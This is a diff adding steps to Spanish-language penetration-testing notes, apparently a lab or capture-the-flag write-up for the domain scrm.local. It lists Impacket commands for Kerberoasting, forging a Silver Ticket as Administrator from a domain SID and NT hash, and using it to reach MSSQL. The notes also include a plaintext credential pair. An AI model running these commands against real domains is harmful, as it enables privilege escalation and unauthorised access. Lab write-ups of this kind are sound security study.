@@ -206,8 +206,24 @@ Obteniendo el Domain SID
 S-1-5-21-2743207045-1827831105-2542523200
 ```
 
+Tercero obtenemos el SPN con la herramienta [[IMPACKET]]
+```shell
+impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-host dc1.scrm.local
+```
+
 Usaremos la herramienta [[IMPACKET]] para obtener el *Silver Ticket*
 ```shell
-
+impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 Administrator -domain scrm.local
 ```
+
+Se nos genera un fichero `Administrator.ccache` el cual lo tenemos que guardar en la variable
+```shell
+export KRB5CCNAME=Administrator.ccache
+```
+
+Pudiendo ahora conectarnos al servicio MSSQL
+```shell
+impacket-mssqlclient dc1.scrm.local -k
+```
+
 
